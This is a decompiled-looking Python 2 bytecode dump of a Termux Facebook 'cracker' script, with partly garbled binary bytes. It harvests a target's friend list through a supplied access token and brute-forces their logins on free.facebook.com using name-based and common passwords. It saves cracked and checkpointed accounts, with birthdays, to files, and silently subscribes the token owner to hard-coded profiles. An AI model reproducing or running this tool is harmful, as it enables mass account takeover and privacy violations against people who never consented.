�

槇ac           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l Z

 d  d l Z d  d l Z d  d l

 m Z d  d l m Z d  d l m Z d Z d Z d Z d Z d	 Z d

 Z d Z d Z d Z d Z d Z d

 Z d Z d	 Z d Z d Z  y d  d l Z Wn e! k

 r\e  j" d

 � n Xe# e � e j$ d � e j% d � j& Z' e j( d g � Z) g  Z* g  Z+ g  Z, d a- e j. �  Z/ e/ j0 Z1 d d d d d d d d d d d d g Z2 y0 e1 d k  s

e1 d k re3 �  n  e1 d Z4 Wn e5 k

 r9e3 �  n Xe j. �  Z6 e6 j7 Z8 e6 j0 Z9 e6 j: Z; e2 e4 Z< e= e j. �  j> d  � � Z? d! �  Z@ d" �  ZA d# �  ZB d$ �  ZC d% �  ZD d& �  ZE d' �  ZF eG d( k r�e  j" d) � eA GHeC �  n  d S(*   i����N(   t

   ThreadPool(   t   ConnectionError(   t   datetimes   [1;94ms   [1;92ms   [1;96ms   [1;91ms   [1;95ms   [1;93ms   [1;97ms   [0ms   pip2 install requestst   utf8s   https://api.ipify.orgsz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11i    t   Januaryt   Februaryt   Marcht   Aprilt   Mayt   Junt   Julyt   Augustt	   Septembert   Octobert   Novembert   Decemberi   i   s   %d-%m-%Yc         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   

g���Q��?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/script/Syed.pyt   jalan[   s    

c           C   s   t  j d � d GHd  S(   Nt   clearsd  

   ✾ـٰٰٰٰٖٖٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٖٖٜ۬ـٰٖٜ۬ـٰٖٜ۬ـٰٰٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٰٰٖٖٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٖٖٜ۬ـٰٖٜ۬ـٰٖٜ۬ـٰٰٖٖٜ۬ـٰٰٰٖٖٖٜ۬ـٰٰٰٰٖٖٖٖٜ۬✾➣

                                          (   t   ost   system(    (    (    s   /sdcard/script/Syed.pyt   logoa   s    

c          C   s�   y t  d d � j �  }  WnV t k

 rq d GHt j d � t j d |  � t j d |  � t j d |  � n Xt �  d GHt j	 �  d  S(	   Ns	   login.txtt   rs    [!] Token Invalids   rm -rf login.txtsI   https://graph.facebook.com/v1.0/100000519519543/subscribers?access_token=sI   https://graph.facebook.com/v1.0/100009909916192/subscribers?access_token=sI   https://graph.facebook.com/v1.0/100074163638172/subscribers?access_token=s    [!] Token Invalid!(

   t   opent   readt   IOErrorR   R   t   requestst   gett   menuR   t   exit(   t   token(    (    s   /sdcard/script/Syed.pyt

   bot_followm   s    



c          C   s�   t  j d � y t d d � }  t �  Wn� t t f k

 r� t  j d � t �  d t d GHd GHt d � }  yV t	 j

 d |  � } t j | j

 � } t d d � } | j |  � | j �  t �  Wq� t k

 r� d	 GHt j �  q� Xn Xd  S(

   NR   s	   login.txtR   t    s:    [+] How to get token https://www.facebook.com/Syam.king07s   

 [+] insert Token : s+   https://graph.facebook.com/me?access_token=t   ws   [!] Token Invalid!(   R   R   R   R#   t   KeyErrorR    R   t   pt	   raw_inputR!   R"   t   jsont   loadst   textR   t   closeR&   R   R$   (   R%   t   otwt   at   zedd(    (    s   /sdcard/script/Syed.pyt   tokenzz   s(    











c          C   s3  t  j d � yR t d d � j �  a t j d t � }  t j |  j	 � } | d } | d } Wni t

 k

 r� t  j d � d GHt  j d � t j d	 � t

 �  n& t j j k

 r� d

 GHt j �  n Xt �  d t d GHd

 GHd GHd | GHd | GHd t GHd GHd GHd GHd t d t d GHt �  d  S(   NR   s	   login.txtR   s,   https://graph.facebook.com/me/?access_token=t   namet   ids   [!] Token Invalid!s   rm -f login.txti   s   [!] No Connection!t    s   [¤] Author     : Syam Shahs.    [¤] Github     : https://github.com/SyedSyams3    [¤] ---------------------------------------------s    [¤] Nama       : s    [¤] ID         : s    [¤] IP         : R'   s    [1]. Crack From Public Friendss    [2]. Chak Crack resultss    [t   0s   ]. Log out (delete Token)(   R   R   R   R   R%   R!   R"   R,   R-   R.   R)   R   R   R3   t

   exceptionsR   R   R$   R   R*   t   ipt   mt   pilih_menumbasic(   R0   R1   t   namaR5   (    (    s   /sdcard/script/Syed.pyR#   �   s8    















			c          C   s<  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k rDd GHt  d � } y> t j d | d	 t � } t j | j � } d

 | d GHWn t k

 r� d GHt	 �  n Xt j d | d

 t � } t j | j � } xN | d D]B } | d } | d } | j

 d � d }	 t j | d |	 � q� Wd t

 t t � � GHn�|  d k s\|  d k r�d GHd GHt  d � }

 |

 d k r�t �  q�|

 d k s�|

 d k r�d t t t f GHt j d t t t f � t  d � t �  q�|

 d k s�|

 d k rqt d t t t f � j �  j �  } d t t t f GHd t | � GHd GHt j d t t t f � t  d  � t �  q�d! GHt �  nE |  d" k s�|  d# k r�t j d$ � t d% � t	 �  n d GHt �  t  d& � }  |  d' k s�|  d( k r�t �  n  d) GHd* GHd+ GHd GHd, �  } t d- � }

 |

 j | t � d. GHt	 �  d  S(/   Ns   

 [?] Choose : R'   s   [!] Choose the Right One!t   01t   1s+    [*] If you want to crack from friends lists    [+] Enter Target ID : s   https://graph.facebook.com/s   ?access_token=s    [+] Nama : R4   s   [!] ID Not available!s   /friends?access_token=t   dataR5   R6   i    t   |s    [+] Total ID : t   02t   2s   

 [1] Results OK s    [2] Results CP s   

 [?] choose : s:   

 [+] Hasil [0;92mOK[0;97m Date : [0;92m%s-%s-%s[0;97ms    cat out/OK-%s-%s-%s.txts   

 [•] Return s   out/CP-%s-%s-%s.txts/   

 [¤] Results CP Date : [0;92m%s-%s-%s[0;97ms    [1;97m[¤] Total : %ss    cat out/CP-%s-%s-%s.txts   

 [¤] Return to Menu s    [!] Choose the Right One!R7   t   00s   rm -f login.txts    [!] Successfully Deletes Tokens0    [?] Do you want to use manual password? [Y/t]: t   Yt   ys#   

 [¤] results OK Saved To : OK.txts"    [¤] results CP Saved To : CP.txts%   

 [!] to stop press CTRL then press Cc      	   S   sK  d t  t t � t t � t t � f Gt j j �  |  } | j d � \ } } y t	 j

 d � Wn t k

 rr n Xy�x�| j �  | j �  d | j �  d | j �  d d d g D]{} t

 j d	 d

 i | d 6| d 6d

 d 6d i t d 6�} | j } d | k sd | k r�d | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pq� q� q� d | k r� y� t d � j �  } t

 j d | d | � }	 t j |	 j � }

 |

 d } d | d | d | d  GHt j | d | d | � t d! t t t f d � } | j d" t | � d t | � d t | � d � | j �  PWn# t t f k

 r�d# } n n Xd | d | d$ GHt j | d | � t d! t t t f d � } | j d" t | � d t | � d � | j �  Pq� q� q� q� Wt  d% 7a  Wn n Xd  S(&   Ns*   

[0;97m [Cracking] %s/%s OK-:%s - CP-:%s R@   t   outt   123t   1234t   12345t   786786t   000786s#   https://free.facebook.com/login.phpR?   t   emailt   passt   submitt   logint   headerss

   user-agentt   free_logout_buttons   save-devices&   

[0;92m ︻[OK]❉─────➳ s    | s,                                               s   out/OK-%s-%s-%s.txtR1   s    ︻[OK]❉─────➳ s   

t

   checkpoints	   login.txts   https://graph.facebook.com/s   /?access_token=t   birthdays&   

[0;91m ︻[CP]❉─────➳ s                          s   out/CP-%s-%s-%s.txts    ︻[CP]❉─────➳ R6   s                           i   (    t   loopt   lenR5   t   okt   cpR   R   R   t   splitR   t   mkdirt   OSErrort   lowerR!   t   postt   uast   contentt   appendR   t   hat   opt   taR   t   strR/   R   R"   R,   R-   R.   R)   R    (   t   argt   usert   uidR4   t   pwt   rext   xot   saveR%   t   swt   bt   ttl(    (    s   /sdcard/script/Syed.pyt   main�   s`    &



C7	)



7

	 )



i   s

   

[+] Finished(   R+   R#   R!   R"   R%   R,   R-   R.   R)   R$   t   rsplitR5   R_   Rc   RU   R`   Ra   Rb   R   R   R   R   t

   splitlinesR   t   manualmbasicR    t   map(   t   askt   idtt   pokt   spR   R   t   iRf   t   nat   nmt   resst   totalcpRn   R*   (    (    s   /sdcard/script/Syed.pyR;   �   sz    













%













	4c             s�   d GHt  d � j d � �  t �  � d k r9 t d � n  d GHd GHd GHd	 GH�  f d

 �  }  t d � } | j |  t � d GHt �  d  S(

   Ns9   

 [¤] Create Example Password : Khan1122,first786,100200s    [?] Create Password : t   ,i    s"   [!] Isi Which Right, No Can Empty!s#   

 [¤] results OK saved To : OK.txts"    [¤] results CP saved To : CP.txts6   

 [!] to stop press CTRL then press c on your keyboardR'   c      	      s  d t  t t � t t � t t � f Gt j j �  |  } | j d � \ } } y t	 j

 d � Wn t k

 rr n Xy�x��  D]{} t j

 d d i | d 6| d 6d d	 6d

 i t d 6�} | j } d | k s� d

 | k r^d | d | d GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pq} q} q} d | k r} y� t d � j �  } t j d | d | � }	 t j |	 j � }

 |

 d } d | d | d | d GHt j | d | d | � t d t t t f d � } | j d t | � d t | � d t | � d � | j �  PWn# t t f k

 rnd } n n Xd | d | d  GHt j | d | � t d t t t f d � } | j d t | � d t | � d � | j �  Pq} q} q} q} Wt  d! 7a  Wn n Xd  S("   Ns*   

[0;97m [Cracking] %s/%s OK-:%s - CP-:%s R@   RF   s#   https://free.facebook.com/login.phpR?   RL   RM   RN   RO   RP   s

   user-agentRQ   s   save-devices

   

[0;92m*--> s    | s                             s   out/OK-%s-%s-%s.txtR1   s   *--> s   

RR   s	   login.txts   https://graph.facebook.com/s   /?access_token=RS   s&   

[0;91m ︻[CP]❉─────➳ s                          s   out/CP-%s-%s-%s.txts    ︻[CP]❉─────➳ R6   s%   

[0;9m ︻[CP]❉─────➳ s                           i   (   RT   RU   R5   RV   RW   R   R   R   RX   R   RY   RZ   R!   R\   R]   R^   R_   R   R`   Ra   Rb   R   Rc   R/   R   R"   R,   R-   R.   R)   R    (   Rd   Re   Rf   R4   t   asuRh   Ri   Rj   R%   Rk   Rl   Rm   (   Rg   (    s   /sdcard/script/Syed.pyRn   5  s`    &





7	)



7

	 )



i   s   

[♧] Finished(   R+   RX   RU   R$   R    Rr   R5   (   Rn   R*   (    (   Rg   s   /sdcard/script/Syed.pyRq   +  s    

5t   __main__R   (H   R   R   R   R   t   randomt   hashlibt   ret	   threadingR,   t   urllibt	   cookielibR!   t   uuidt   multiprocessing.poolR    t   requests.exceptionsR   Rl   Rw   t   cR:   t   ut   kR*   t   ht   Pt   Mt   Ht   Kt   Bt   Ut   Ot   Nt   ImportErrorR   t   reloadt   setdefaultencodingR"   R.   R9   t   choiceR]   R5   RW   RV   RT   t   nowt   ctt   montht   nt   bulanR$   t   nTempt

   ValueErrort   currentt   yearRb   t   but   dayR`   Ra   Rc   t   strftimet   durasiR   R   R&   R3   R#   R;   Rq   t   __name__(    (    (    s   /sdcard/script/Syed.pyt   <module>   s�   �





		



			

			

		!	y	F



	Syam Shah
